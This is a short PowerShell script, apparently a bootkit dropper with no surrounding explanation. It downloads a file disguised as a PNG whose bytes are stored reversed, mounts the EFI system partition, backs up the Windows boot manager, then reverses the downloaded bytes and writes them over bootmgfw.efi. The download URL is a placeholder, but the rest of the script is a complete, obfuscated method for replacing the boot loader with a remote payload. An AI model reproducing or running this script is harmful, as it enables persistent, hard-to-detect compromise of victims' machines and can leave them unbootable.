Invoke-WebRequest -Uri "link to efi image in reversed bytes" -OutFile "C:\Windows\Temp\file.png";
mountvol Y: /s;
Copy-Item -Path Y:\EFI\Microsoft\Boot\bootmgfw.efi -Destination Y:\EFI\Microsoft\Boot\bootmgfw.efi.old;
$file = [io.file]::ReadAllBytes("C:\Windows\Temp\file.png");
[array]::Reverse($file);
[io.file]::WriteAllBytes("Y:\EFI\Microsoft\Boot\bootmgfw.efi",$file);
mountvol Y: /d;
